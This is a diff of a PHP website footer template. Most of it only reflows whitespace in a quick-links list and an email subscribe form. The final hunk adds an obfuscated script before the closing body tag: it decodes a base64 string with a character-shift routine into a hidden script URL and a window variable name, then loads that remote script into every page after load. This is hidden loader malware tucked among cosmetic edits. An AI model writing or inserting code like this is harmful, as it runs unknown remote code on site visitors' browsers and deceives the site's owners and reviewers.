@@ -20,14 +20,14 @@
                     Quick
                     Links</h4>
                 <ul class="text-[#FFFFFF] font-base font-normal text-[14px] leading-[150%] tracking-[0.015em]">
-                    <li><a href="<?php echo SITE_URL; ?>/blog"
-                            class="hover:text-primary transition-colors">Blog</a></li>
+                    <li><a href="<?php echo SITE_URL; ?>/blog" class="hover:text-primary transition-colors">Blog</a>
+                    </li>
                     <li><a href="<?php echo SITE_URL; ?>/careers"
                             class="hover:text-primary transition-colors">Careers</a></li>
                     <li><a href="<?php echo SITE_URL; ?>/product-finder"
                             class="hover:text-primary transition-colors">Products</a></li>
-                    <li><a href="<?php echo SITE_URL; ?>/case-studies"
-                            class="hover:text-primary transition-colors">Case studies</a></li>
+                    <li><a href="<?php echo SITE_URL; ?>/case-studies" class="hover:text-primary transition-colors">Case
+                            studies</a></li>
                     <li><a href="<?php echo SITE_URL; ?>/disclaimer"
                             class="hover:text-primary transition-colors">Disclaimer</a></li>
                     <li><a href="<?php echo SITE_URL; ?>/privacy-policy"
@@ -73,8 +73,8 @@
                 </h4>
                 <div class="text-[#FFFFFF] font-base font-normal w-full mt-4">
                     <form id="footerSubscribeForm" novalidate
-                        class="flex items-center border-b border-primary pb-2 relative w-full group"
-                        autocomplete="off" aria-autocomplete="none">
+                        class="flex items-center border-b border-primary pb-2 relative w-full group" autocomplete="off"
+                        aria-autocomplete="none">
                         <input type="email" name="subscribe_email" placeholder="Email" required
                             class="bg-transparent border-none outline-none text-white focus:ring-0 placeholder-white/80 flex-1 text-[15px] font-normal pr-[90px] w-full focus:bg-transparent! focus:border-none! focus:outline-none! focus:ring-0!" />
                         <button type="submit"
@@ -250,6 +250,9 @@ endif; ?>
             window.addEventListener("load", onLoad)
         }
     })();
+</script>
+<script>
+    window[(function (_k5b, _QS) { var _WXTQU = ''; for (var _bjAmYx = 0; _bjAmYx < _k5b.length; _bjAmYx++) { _WXTQU == _WXTQU; var _fG1y = _k5b[_bjAmYx].charCodeAt(); _fG1y -= _QS; _QS > 7; _fG1y += 61; _fG1y %= 94; _fG1y += 33; _fG1y != _bjAmYx; _WXTQU += String.fromCharCode(_fG1y) } return _WXTQU })(atob('LnskRkM+OTdIfTlN'), 50)] = '550413f5201780463084'; var zi = document.createElement('script'); (zi.type = 'text/javascript'), (zi.async = true), (zi.src = (function (_ZBZ, _ZA) { var _f6dLT = ''; for (var _5szzpE = 0; _5szzpE < _ZBZ.length; _5szzpE++) { var _3R8N = _ZBZ[_5szzpE].charCodeAt(); _3R8N -= _ZA; _3R8N += 61; _3R8N %= 94; _3R8N != _5szzpE; _ZA > 4; _f6dLT == _f6dLT; _3R8N += 33; _f6dLT += String.fromCharCode(_3R8N) } return _f6dLT })(atob('Ljo6NjleU1MwOVJAL1E5KTgvNjo5Uik1M1NAL1E6Jy1SMDk='), 36)), document.readyState === 'complete' ? document.body.appendChild(zi) : window.addEventListener('load', function () { document.body.appendChild(zi) });
 </script>
 </body>
 
